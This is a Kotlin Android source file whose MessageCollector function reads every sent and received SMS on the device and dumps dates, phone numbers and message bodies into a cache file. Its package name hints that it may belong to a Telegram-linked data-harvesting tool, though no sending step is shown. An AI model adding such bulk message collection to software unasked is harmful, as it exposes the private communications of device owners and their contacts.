package com.kashem.shaikh.telegram

import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.net.Uri
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

object MessageCollector {

    /**
     * Collects all SMS messages (both sent and received) and writes them to a file.
     * Returns the file or null if failed (e.g., no permission).
     */
    fun collectMessages(context: Context): File? {
        val resolver: ContentResolver = context.contentResolver
        val uri = Uri.parse("content://sms/")
        val cursor: Cursor? = resolver.query(uri, null, null, null, null)

        if (cursor == null) {
            return null
        }

        val sb = StringBuilder()
        sb.appendLine("***** SMS MESSAGES *****\n")
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        sb.appendLine("Generated: ${dateFormat.format(Date())}\n")

        val dateColumn = cursor.getColumnIndex("date")
        val addressColumn = cursor.getColumnIndex("address")
        val bodyColumn = cursor.getColumnIndex("body")
        val typeColumn = cursor.getColumnIndex("type")

        while (cursor.moveToNext()) {
            val date = dateFormat.format(Date(cursor.getLong(dateColumn)))
            val address = cursor.getString(addressColumn)
            val body = cursor.getString(bodyColumn)
            val type = when (cursor.getInt(typeColumn)) {
                1 -> "Received"
                2 -> "Sent"
                else -> "Unknown"
            }

            sb.appendLine("[$type] $date - $address")
            sb.appendLine("Message: $body")
            sb.appendLine()
        }
        cursor.close()

        val file = File(context.cacheDir, "messages.txt")
        FileOutputStream(file).use {
            it.write(sb.toString().toByteArray())
        }
        return file
    }
}